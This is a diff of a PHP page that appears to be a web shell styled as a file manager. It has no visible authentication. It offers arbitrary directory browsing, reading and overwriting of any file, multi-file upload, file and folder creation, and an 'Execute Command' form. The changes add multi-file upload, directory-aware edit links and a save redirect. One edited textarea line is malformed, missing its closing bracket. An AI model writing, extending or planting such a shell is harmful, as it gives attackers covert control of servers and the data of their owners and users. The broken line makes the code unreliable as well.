@@ -23,8 +23,8 @@
         .permission-red { color: red; }
         .current-directory h3 {
             text-align: center;
-		.home-link { font-size: 18px; margin-bottom: 10px; }
         }
+        .home-link { font-size: 18px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -104,7 +104,7 @@
             echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
             foreach ($files as $file) {
                 echo '<tr>';
-                echo '<td><a href="?edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
+                echo '<td><a href="?dir='.urlencode($dir).'&edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
                 echo '<td>'.$file['size'].'</td>';
                 echo '<td class="'.$file['permissionClass'].'">'.$file['permissions'].'</td>';
                 echo '<td>'.$file['lastModified'].'</td>';
@@ -114,25 +114,27 @@
             echo '</table>';
         }
 
-        $currentDir = getcwd();
+        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
 
-        if (isset($_GET['dir'])) {
-            $newDir = $_GET['dir'];
-            if (is_dir($newDir)) {
-                $currentDir = realpath($newDir);
-            }
+        if (isset($_GET['dir']) && is_dir($_GET['dir'])) {
+            $currentDir = realpath($_GET['dir']);
         }
 
         chdir($currentDir);
 
         // Aploder
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
             $uploadDir = $currentDir . '/';
-            $uploadFile = $uploadDir . basename($_FILES['file']['name']);
-            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
-                echo '<p>File uploaded successfully.</p>';
-            } else {
-                echo '<p>Failed to upload file.</p>';
+            
+            // Loop untuk menangani beberapa file
+            foreach ($_FILES['files']['name'] as $key => $name) {
+                $uploadFile = $uploadDir . basename($name);
+                
+                if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $uploadFile)) {
+                    echo '<p>File ' . htmlspecialchars($name) . ' uploaded successfully.</p>';
+                } else {
+                    echo '<p>Failed to upload file ' . htmlspecialchars($name) . '.</p>';
+                }
             }
         }
 
@@ -152,7 +154,10 @@
             $fileToSave = $_POST['filename'];
             $content = $_POST['content'];
             file_put_contents($fileToSave, $content);
-            echo '<p>File saved successfully.</p>';
+            // Tetap berada di halaman edit setelah menyimpan
+            $dir = dirname($fileToSave);
+            header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($fileToSave));
+            exit;
         }
 
         // Krit dir
@@ -200,57 +205,42 @@
         ?>
 
         <form method="POST" enctype="multipart/form-data">
-            <input type="file" name="file">
-            <button type="submit">Upload</button>
-        </form>
-
-        <hr>
-
-        <div class="current-directory">
-            <?php renderBreadcrumb($currentDir); ?>
-            <h3>Current Directory:</h3>
-        </div>
-
-        <?php
-        listFiles($currentDir);
-        ?>
-
-        <hr>
-
-        <form method="POST">
-            <h3>Create New Directory:</h3>
-            <input type="text" name="new_dir" placeholder="New Directory Name">
-            <button type="submit">Create Directory</button>
+            <input type="file" name="files[]" multiple>
+            <button type="submit">Upload Files</button>
         </form>
 
         <form method="POST">
-            <h3>Create New File:</h3>
-            <input type="text" name="new_file" placeholder="New File Name">
+            <input type="text" name="command" placeholder="Enter command">
+            <button type="submit">Execute Command</button>
+        </form>
+
+        <form method="POST">
+            <input type="text" name="new_file" placeholder="New file name">
             <button type="submit">Create File</button>
         </form>
 
-        <hr>
-
         <form method="POST">
-            <h3>Execute Command:</h3>
-            <input type="text" name="command" placeholder="Command">
-            <button type="submit">Execute</button>
+            <input type="text" name="new_dir" placeholder="New directory name">
+            <button type="submit">Create Directory</button>
         </form>
 
         <?php
+        renderBreadcrumb($currentDir);
+
         if (isset($_GET['edit'])) {
             $fileToEdit = $_GET['edit'];
             if (is_file($fileToEdit)) {
                 $content = file_get_contents($fileToEdit);
+                echo '<h3>Edit File: ' . htmlspecialchars($fileToEdit) . '</h3>';
                 echo '<form method="POST">';
-                echo '<h3>Editing File: ' . htmlspecialchars($fileToEdit) . '</h3>';
-                echo '<textarea name="content" rows="20" cols="80">' . htmlspecialchars($content) . '</textarea><br>';
+                echo '<textarea name="content" rows="20" cols="105"' . htmlspecialchars($content) . '</textarea><br>';
                 echo '<input type="hidden" name="filename" value="' . htmlspecialchars($fileToEdit) . '">';
-                echo '<button type="submit" name="save">Save File</button>';
+                echo '<button type="submit" name="save">Save</button>';
                 echo '</form>';
             }
         }
         ?>
+        <?php listFiles($currentDir); ?>
     </div>
 </body>
 </html>
